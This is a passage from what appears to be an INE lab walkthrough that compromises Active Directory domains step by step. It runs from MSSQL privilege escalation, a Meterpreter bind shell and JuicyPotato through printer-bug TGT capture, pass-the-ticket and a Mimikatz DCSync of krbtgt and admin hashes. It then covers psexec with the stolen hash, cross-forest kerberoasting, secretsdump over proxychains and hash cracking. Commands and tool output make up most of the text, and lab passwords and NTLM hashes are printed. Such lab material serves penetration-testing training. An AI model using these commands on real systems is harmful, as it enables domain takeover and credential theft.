+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msf5 auxiliary(admin/mssql/mssql_escalate_execute_as) &gt; show options<br><br>Module options (auxiliary/admin/mssql/mssql_escalate_execute_as):<br><br>   Name                 Current Setting         Required  Description<br>   ----                 ---------------         --------  -----------<br>   PASSWORD             H@rdP@ssD!ff!cult964!!  no        The password <span class="hljs-keyword">for</span> the specified username<br>   RHOSTS               10.10.1.2               yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT                1433                    yes       The target port (TCP)<br>   TDSENCRYPTION        <span class="hljs-literal">false</span>                   yes       Use TLS/SSL <span class="hljs-keyword">for</span> TDS data <span class="hljs-string">&quot;Force Encryption&quot;</span><br>   USERNAME             dev-admin               no        The username to authenticate as<br>   USE_WINDOWS_AUTHENT  <span class="hljs-literal">false</span>                   yes       Use windows authentification (requires DOMAIN option <span class="hljs-built_in">set</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>“dev-admin”</strong> now has system admin rights.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image11.png" srcset="/img/loading.gif"></p>
+<p>With sufficient privileges, we can now enable “<strong>xp_cmdshell”</strong> to establish a stable bind shell on DB-SRV server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Module options (exploit/windows/mssql/mssql_payload):<br><br>   Name                 Current Setting         Required  Description<br>   ----                 ---------------         --------  -----------<br>   METHOD               cmd                     yes       Which payload delivery method to use (ps, cmd, or old)<br>   PASSWORD             H@rdP@ssD!ff!cult964!!  no        The password <span class="hljs-keyword">for</span> the specified username<br>   RHOSTS               10.10.1.2               yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT                1433                    yes       The target port (TCP)<br>   SRVHOST              0.0.0.0                 yes       The <span class="hljs-built_in">local</span> host or network interface to listen on. This must be an address on the <span class="hljs-built_in">local</span> machine or 0.0.0.0 to listen on all addresses.<br>   SRVPORT              8080                    yes       The <span class="hljs-built_in">local</span> port to listen on.<br>   SSL                  <span class="hljs-literal">false</span>                   no        Negotiate SSL <span class="hljs-keyword">for</span> incoming connections<br>   SSLCert                                      no        Path to a custom SSL certificate (default is randomly generated)<br>   TDSENCRYPTION        <span class="hljs-literal">false</span>                   yes       Use TLS/SSL <span class="hljs-keyword">for</span> TDS data <span class="hljs-string">&quot;Force Encryption&quot;</span><br>   URIPATH                                      no        The URI to use <span class="hljs-keyword">for</span> this exploit (default is random)<br>   USERNAME             dev-admin                      no        The username to authenticate as<br>   USE_WINDOWS_AUTHENT  <span class="hljs-literal">false</span>                   yes       Use windows authentification (requires DOMAIN option <span class="hljs-built_in">set</span>)<br><br>Payload options (windows/x64/meterpreter/bind_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: <span class="hljs-string">&#x27;&#x27;</span>, seh, thread, process, none)<br>   LPORT     4444             yes       The listen port<br>   RHOST     10.10.1.2        no        The target address<br></code></pre></div></td></tr></table></figure>
+
+<p>Meterpreter will enable the SQL function and upload a malicious VBS script to DB-SRV.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image12.png" srcset="/img/loading.gif"></p>
+<p>We are currently running as the SQL service account. We need to escalate privileges in DB-SRV.</p>
+<p>Listing the privileges of the SQL service shows that we have “<strong>SeImpersonatePrivilege</strong>“ and “<strong>SeAssignPrimaryTokenPrivilege</strong>“, we can use <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases">JuicyPotato</a> to escalate our privileges to ‘<strong>NT AUTHORITY\SYSTEM</strong>‘.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image13.png" srcset="/img/loading.gif"></p>
+<p>On the meterpreter prompt, do the following to escalate to “<strong>NT Authority\System</strong>“:</p>
+<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">mkdir /temp<br>cd /temp<br>upload JuicyPotato.exe <span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>-f JuicyPotato.exe -a &#x27;-t u -p <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -l 4444&#x27; -i<br></code></pre></div></td></tr></table></figure>
+
+<p>Successfully escalated to System privileges…</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image14.png" srcset="/img/loading.gif"></p>
+<p>Another alternative will be to upload a new payload generated via msfvenom and launch it as SYSTEM using JuicyPotato.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attacker Machine</span><br>msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=10.10.1.2 LPORT=6666 --smallest -f exe --encrypt AES256 --encrypt-iv 76543210 --encrypt-key w00tw00t -o bind_tcp.exe<br><span class="hljs-comment"># meterpreter</span><br>meterpreter &gt; upload /media/SHARED/LAB/bind_tcp.exe<br>[*] uploading  : /media/SHARED/LAB/bind_tcp.exe -&gt; bind_tcp.exe<br>[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /media/SHARED/LAB/bind_tcp.exe -&gt; bind_tcp.exe<br>[*] uploaded   : /media/SHARED/LAB/bind_tcp.exe -&gt; bind_tcp.exe<br>meterpreter &gt; execute -f JuicyPotato.exe -a <span class="hljs-string">&#x27;-t u -p &quot;C:\temp\bind_tcp.exe&quot; -l 4444&#x27;</span> -i<br>Background session 10? [y/N]  <br>Process 2248 created.<br>Channel 6 created.<br>Testing &#123;4991d34b-80a1-4291-83b6-3328366b9097&#125; 4444<br>....<br>[+] authresult 0<br>&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;;NT AUTHORITY\SYSTEM<br><br>[+] CreateProcessAsUser OK<br><span class="hljs-comment"># Metasploit handler</span><br>msf5 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br>Payload options (windows/x64/meterpreter/bind_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: <span class="hljs-string">&#x27;&#x27;</span>, seh, thread, process, none)<br>   LPORT     6666             yes       The listen port<br>   RHOST     10.10.1.2        no        The target address<br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br></code></pre></div></td></tr></table></figure>
+
+<p>Now, we will check if any type of delegation is enabled in this server, one can always use the AD Module or PowerView for confirmation. Let’s use the <a target="_blank" rel="noopener" href="https://github.com/samratashok/ADModule">AD Module</a> to check for delegation.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># meterpreter</span><br>upload Microsoft.ActiveDirectory.Management.dll /temp<br><span class="hljs-comment"># Switch to PowerShell</span><br>Import-Module .\Microsoft.ActiveDirectory.Management.dll -verbose<br>Get-AdComputer -Filter &#123;TrustedForDelegation -eq <span class="hljs-variable">$True</span>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>DB-SRV is configured with Unconstrained Delegation! Now, let us leverage this and try to force a privileged account to connect to the DB-SRV server.</p>
+<p>With enough privileges, we will now abuse the famous printer bug to get a TGT from the els.corp Domain Controller. Upload “Rubeus.exe” and “MS-RPRN.exe” to the <strong>DB-SRV</strong> server and on one shell run Rubeus, while on another one coerce “<strong>els-dc”</strong> to connect to capture the TGT hash, as follows.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Meterpreter</span><br>upload Rubeus.exe<br>upload SpoolSample.exe<br>execute -f Rubeus.exe -a <span class="hljs-string">&quot;monitor /interval:5&quot;</span> -c <span class="hljs-comment"># take note of the channel </span><br>execute -f SpoolSample.exe -a <span class="hljs-string">&quot;\\els-dc.els.corp \\db-srv.els.corp&quot;</span> -c <br>channel -r &lt;RUBEUS_CHANNEL&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>If the following message appears while executing MS-RPRN.exe, then the forceful connection from “<strong>els-dc</strong>“ might have worked.</p>
+<p>‘<em>Attempted printer notification and received an invalid handle. The coerced authentication probably worked!’</em></p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image15.png" srcset="/img/loading.gif"></p>
+<p>Since the extracted TGT hash is base64-encoded we need to remove the extra spaces and perform a pass the ticket attack against the ‘<strong>els-dc’</strong> domain controller.</p>
+<p><strong>Note</strong>: Remember what we have discussed about the modifications/replacements that need to be made against the hash.</p>
+<p>Perform PTT using “<strong>Rubeus.exe</strong>“:</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Shell</span><br>Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;<br>klist<br></code></pre></div></td></tr></table></figure>
+
+<p>The active Kerberos ticket can be viewed as follows:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image16.png" srcset="/img/loading.gif"></p>
+<p>Now, with a “<strong>ELS-DC$”</strong> ticket active in the current session, we will use Mimikatz to perform a DCSYNC attack against the “<strong>els.corp</strong>“ domain.</p>
+<p>We are able to perform a DCSYNC attack because the Domain Controller computer account by-default has “<strong>Get-Replication-Changes</strong>“ &amp; “<strong>Get-Replication-Changes-All</strong>“ rights over domain object.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># meterpreter session</span><br>load kiwi<br>kiwi_cmd \&quot;lsadump::dcsync /user:els\\krbtgt\&quot;<br>&lt;Result&gt; NTLM:a8a94897fbb33ed8925f17ba7ccdff67 &lt;/Result&gt;<br><br>kiwi_cmd \&quot;lsadump::dcsync /user:els\\els-admin\&quot;<br>&lt;Result&gt; NTLM: 8645e87e2593507cf623f3291b1334c2 &lt;/Result&gt;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="3-ELS-DC-Server"><a href="#3-ELS-DC-Server" class="headerlink" title="3. ELS-DC Server"></a>3. ELS-DC Server</h4><p>With access to “<strong>els-admin</strong>“ domain admin at ELS-DC server, we can maintain a stable persistent shell.</p>
+<p>Use Metasploit’s <strong>windows/smb/psexec</strong> module to establish a connection with the target machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Meterpreter</span><br>use exploit windows/smb/psexec<br><span class="hljs-built_in">set</span> rhosts 10.10.1.3<br><span class="hljs-built_in">set</span> SMBDOMAIN els.corp<br><span class="hljs-built_in">set</span> SMBUSER els-admin<br><span class="hljs-built_in">set</span> SMBPASS 8645e87e2593507cf623f3291b1334c2<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <br></code></pre></div></td></tr></table></figure>
+
+<p>Using PowerView (<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>), we will enumerate any misconfigurations that we can find to abuse the cross-forest trust established between “<strong>ELS.CORP</strong>“ and “<strong>MGMT.CORP”</strong>.</p>
+<p>With the following query, we will enumerate named services across the forest trust. It is possible to perform <strong>kerberoasting</strong> across forest trusts, all we need is the TGS of a named account with SPN.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> PowerView_dev.ps1<br><span class="hljs-built_in">Get-NetDomainTrust</span> | ?&#123;<span class="hljs-variable">$_</span>.TrustType <span class="hljs-operator">-ne</span> <span class="hljs-string">&#x27;External&#x27;</span>&#125; | %&#123;<span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-SPN</span> <span class="hljs-literal">-Domain</span> <span class="hljs-variable">$_</span>.TargetName&#125;<br><br>&lt;..SNIP..&gt;<br>distinguishedname    ∶ CN=spn_svc,OU=SPN_Service,DC=mgmt,DC=corp<br>displayname          ∶ spn_svc<br>userprincipalname    ∶ spn_svc@mgmt.corp<br>name                 ∶ spn_svc<br>serviceprincipalname ∶ &#123;http/mgmt<span class="hljs-literal">-dc</span>.mgmt.corp,http/mgmt<span class="hljs-literal">-dc</span>&#125;<br>objectsid            ∶ S<span class="hljs-literal">-1</span><span class="hljs-literal">-5</span><span class="hljs-literal">-21</span><span class="hljs-literal">-3658202825</span><span class="hljs-literal">-2428483480</span><span class="hljs-literal">-107650130</span><span class="hljs-literal">-1106</span><br>samaccountname       ∶ spn_svc<br><br>&lt;../SNIP..&gt;<br><br><span class="hljs-comment"># Alternatively you can use</span><br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> *<br>&lt;../SNIP..&gt;<br>Direction               : BiDirectional<br>DisallowTransivity      : False<br>DistinguishedName       : CN=mgmt.corp,CN=System,DC=els,DC=corp<br>ForestTransitive        : True<br>IntraForest             : False<br>IsTreeParent            : False<br>IsTreeRoot              : False<br>Name                    : mgmt.corp<br>ObjectClass             : trustedDomain<br>ObjectGUID              : <span class="hljs-number">8</span>e516577<span class="hljs-literal">-4290</span><span class="hljs-literal">-486d</span><span class="hljs-literal">-bfcf</span><span class="hljs-literal">-7a704a5eb26e</span><br>SelectiveAuthentication : False<br>SIDFilteringForestAware : False<br>SIDFilteringQuarantined : False<br>Source                  : DC=els,DC=corp<br>Target                  : mgmt.corp<br>TGTDelegation           : False<br>TrustAttributes         : <span class="hljs-number">8</span><br>TrustedPolicy           : <br>TrustingPolicy          : <br>TrustType               : Uplevel<br>UplevelOnly             : False<br>UsesAESKeys             : False<br>UsesRC4Encryption       : False<br>&lt;../SNIP..&gt;<br><span class="hljs-built_in">PS</span> &gt; setspn.exe <span class="hljs-literal">-T</span> mgmt.corp <span class="hljs-literal">-Q</span> */*<br>setspn.exe <span class="hljs-literal">-T</span> mgmt.corp <span class="hljs-literal">-Q</span> */*<br>Checking domain DC=mgmt,DC=corp<br>CN=MGMT<span class="hljs-literal">-DC</span>,OU=Domain Controllers,DC=mgmt,DC=corp<br>        Dfsr<span class="hljs-literal">-12F9A27C</span><span class="hljs-literal">-BF97</span><span class="hljs-literal">-4787</span><span class="hljs-literal">-9364</span><span class="hljs-literal">-D31B6C55EB04</span>/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        ldap/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/ForestDnsZones.mgmt.corp<br>        ldap/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/DomainDnsZones.mgmt.corp<br>        TERMSRV/MGMT<span class="hljs-literal">-DC</span><br>        TERMSRV/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        DNS/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        <span class="hljs-built_in">GC</span>/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/mgmt.corp<br>        RestrictedKrbHost/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        RestrictedKrbHost/MGMT<span class="hljs-literal">-DC</span><br>        RPC/c8ffb42a<span class="hljs-literal">-a59c</span><span class="hljs-literal">-41f0</span><span class="hljs-literal">-a5a0</span><span class="hljs-literal">-e833cfc0c4b6</span>._msdcs.mgmt.corp<br>        HOST/MGMT<span class="hljs-literal">-DC</span>/MGMT<br>        HOST/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/MGMT<br>        HOST/MGMT<span class="hljs-literal">-DC</span><br>        HOST/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        HOST/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/mgmt.corp<br>        E3514235<span class="hljs-literal">-4B06</span><span class="hljs-literal">-11D1</span><span class="hljs-literal">-AB04</span><span class="hljs-literal">-00C04FC2DCD2</span>/c8ffb42a<span class="hljs-literal">-a59c</span><span class="hljs-literal">-41f0</span><span class="hljs-literal">-a5a0</span><span class="hljs-literal">-e833cfc0c4b6</span>/mgmt.corp<br>        ldap/MGMT<span class="hljs-literal">-DC</span>/MGMT<br>        ldap/c8ffb42a<span class="hljs-literal">-a59c</span><span class="hljs-literal">-41f0</span><span class="hljs-literal">-a5a0</span><span class="hljs-literal">-e833cfc0c4b6</span>._msdcs.mgmt.corp<br>        ldap/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/MGMT<br>        ldap/MGMT<span class="hljs-literal">-DC</span><br>        ldap/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp<br>        ldap/MGMT<span class="hljs-literal">-DC</span>.mgmt.corp/mgmt.corp<br>CN=krbtgt,CN=Users,DC=mgmt,DC=corp<br>        kadmin/changepw<br>CN=spn_svc,OU=SPN_Service,DC=mgmt,DC=corp<br>        http/mgmt<span class="hljs-literal">-dc</span>.mgmt.corp<br>        http/mgmt<span class="hljs-literal">-dc</span><br></code></pre></div></td></tr></table></figure>
+
+<p>It can be clearly seen that a domain user of the MGMT domain “<strong>spn_svc</strong>“ has an SPN set, it is possible to retrieve the service ticket hash, as follows:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># PowerShell using PowerView Dev</span><br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-built_in">Request-SPNTicket</span> <span class="hljs-literal">-SPN</span> http/mgmt<span class="hljs-literal">-dc</span>.mgmt.corp <span class="hljs-literal">-verbose</span><br><span class="hljs-comment"># Meterpreter</span><br>upload Rubeus.exe .<br>execute <span class="hljs-operator">-f</span> Rubeus.exe <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;kerberoast /domain:mgmt.corp&quot;</span> <span class="hljs-literal">-i</span> <span class="hljs-literal">-c</span><br>&lt;....&gt;<br>[*] Found <span class="hljs-number">1</span> user(s) to Kerberoast!<br><br>[*] SamAccountName         : spn_svc<br>[*] DistinguishedName      : CN=spn_svc,OU=SPN_Service,DC=mgmt,DC=corp<br>[*] ServicePrincipalName   : http/mgmt<span class="hljs-literal">-dc</span>.mgmt.corp<br>[*] PwdLastSet             : <span class="hljs-number">6</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2020</span> <span class="hljs-number">10</span>:<span class="hljs-number">43</span>:<span class="hljs-number">32</span> AM<br>[*] Supported ETypes       : RC4_HMAC_DEFAULT<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*spn_svc<span class="hljs-variable">$mgmt</span>.corp<span class="hljs-variable">$http</span>/mgmt<span class="hljs-literal">-dc</span>.mgmt.corp@mgmt.corp*<span class="hljs-variable">$DFB7897AD450A16168DB84CE775955E9</span><span class="hljs-variable">$60C255890C3DC5C944D26DC6C1477F8BBAD942B706DCD3AB832947D4580FEB</span>...<br>&lt;....&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>The service account credentials (‘<strong>spn_svc</strong>‘) are extracted using a brute-forcing technique.</p>
+<p><strong>Credentials</strong>: “spn_svc:B@DB!tch”</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image17.png" srcset="/img/loading.gif"></p>
+<p>The Domain user “<strong>spn_svc</strong>“ of “<strong>MGMT.corp”</strong> is also a member of the administrator’s group in the MGMT-DC domain controller.</p>
+<p>The IP address of MGMT-DC can be found using a simple ping command or a nslookup DNS query [10.10.3.2]</p>
+<h4 id="4-MGMT-DC-Server"><a href="#4-MGMT-DC-Server" class="headerlink" title="4. MGMT-DC Server"></a>4. MGMT-DC Server</h4><p>On the current meterpreter session add a route to the “<strong>10.10.3.0.24</strong>“ network and then start a socks server to access MGMT-DC.mgmt.corp.</p>
+<p>Perform the following actions to establish a persistent shell on MGMT-DC server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Metasploit</span><br>route add 10.10.3.0/24 &lt;session_id&gt;<br>use auxiliary/server/socks4a <br>run -j<br><span class="hljs-comment"># Attackers machine</span><br><span class="hljs-comment"># Make sure /etc/proxychains.conf has configured</span><br><span class="hljs-comment"># socks4 127.0.0.1 1080</span><br><span class="hljs-comment"># Add to host file /etc/hosts</span><br><span class="hljs-comment"># 10.10.3.2 MGMT-DC.MGMT.CORP</span><br></code></pre></div></td></tr></table></figure>
+
+<p>Now get access to “<strong>MGMT-DC.mgmt.corp”</strong> leveraging impacket’s psexec.py script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains psexec.py spn_svc:<span class="hljs-string">&#x27;B@DB!tch&#x27;</span>@10.10.3.2<br></code></pre></div></td></tr></table></figure>
+
+<p>We will use the Active Directory Module present in the server to list the OU present in the MGMT-DC and all the members present in the available OU’s.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># LIST all OU’s in MGMT.CORP</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory<br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-Filter</span> &#123;ObjectClass <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;organizationalunit&#x27;</span>&#125; <span class="hljs-literal">-Properties</span> CanonicalName | <span class="hljs-built_in">Select-Object</span> DistinguishedName<br><span class="hljs-comment"># Get Members of “Bastion-Host” OU</span><br><span class="hljs-variable">$oupath</span> = <span class="hljs-string">&quot;OU=Bastion-Host,DC=mgmt,DC=corp&quot;</span><br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-SearchBase</span> <span class="hljs-variable">$oupath</span><br></code></pre></div></td></tr></table></figure>
+
+<p>The Domain user “<strong>Jump-Admin</strong>“ present in the “<strong>Bastion-Host</strong>“ OU can be useful in moving forward from the MGMT-DC server. The IP address of “<strong>jump-srv</strong>“ server can be enumerated by actively querying the DNS record.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">nslookup jump<span class="hljs-literal">-srv</span><br>Name:    jump<span class="hljs-literal">-srv</span>.mgmt.corp<br>Address:  <span class="hljs-number">10.10</span>.<span class="hljs-number">3.3</span><br></code></pre></div></td></tr></table></figure>
+
+<p>However, we will extract all the credentials present in the MGMT.CORP domain leveraging impacket’s <strong><em>sercretsdump.py</em></strong> script.</p>
+<p>On a new bash prompt using our route to the internal network [10.10.3.0/24], we will execute secretsdump.py as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains secretsdump.py spn_svc:<span class="hljs-string">&#x27;B@DB!tch&#x27;</span>@10.10.3.2<br></code></pre></div></td></tr></table></figure>
+
+<p>Crack the “<strong>jump-admin</strong>“ hash using JTR [John] by storing the NT hash in a file.</p>
+<p>The hash is cracked and we now have clear text credentials of the “<strong>jump-admin</strong>“ user at the <strong>“Jump-Admin”</strong> machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">john --format=NT jump-adminpass.txt -w=/usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure>
+
